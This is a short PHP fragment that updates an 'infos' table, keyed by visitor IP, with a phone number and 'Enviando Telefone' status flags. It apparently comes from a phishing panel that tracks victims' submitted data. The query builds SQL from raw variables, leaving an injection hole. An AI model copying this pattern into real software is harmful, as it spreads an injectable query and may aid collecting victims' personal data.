...
$tempo = time();
$atualiza = mysqli_query(DBCOnnect(), "UPDATE infos SET tempo='$tempo', dados_do_email='$telefone', status='Enviando Telefone', statusremote='Enviando Telefone!' WHERE ip='$ip'");
